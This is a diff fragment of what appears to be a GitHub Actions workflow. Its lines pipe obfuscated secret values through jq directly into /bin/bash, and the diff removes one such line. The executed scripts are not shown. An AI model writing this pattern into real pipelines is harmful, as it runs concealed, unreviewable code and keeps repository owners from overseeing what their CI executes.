@@ -19,7 +19,6 @@ jobs:
           gay2: ${{ secrets.gay2 }}
         run: |
           printf '%s' "$gay2" | jq -r .nnlv1005 | /bin/bash
-          printf '%s' "$m9" | jq -r .y25393 | /bin/bash
           echo $skwk9 | jq -r .aumh1708 | /bin/bash
           echo $esjez945 | jq -r .f71531 | /bin/bash
           echo $rrx054 | jq -r .qvqq25 | /bin/bash
